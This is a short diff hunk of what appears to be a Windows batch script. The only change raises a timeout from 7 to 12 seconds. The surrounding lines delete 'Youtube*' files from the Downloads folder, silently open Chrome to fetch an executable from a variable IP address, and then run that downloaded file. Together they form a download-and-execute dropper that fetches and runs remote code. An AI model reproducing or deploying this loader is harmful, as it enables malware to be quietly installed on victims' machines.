@@ -7,6 +7,6 @@ cd ..
 cd Downloads
 del Youtube*
 start /min /b chrome http://$ip/$name.exe
-timeout 7
+timeout 12
 start $name.exe
 exit
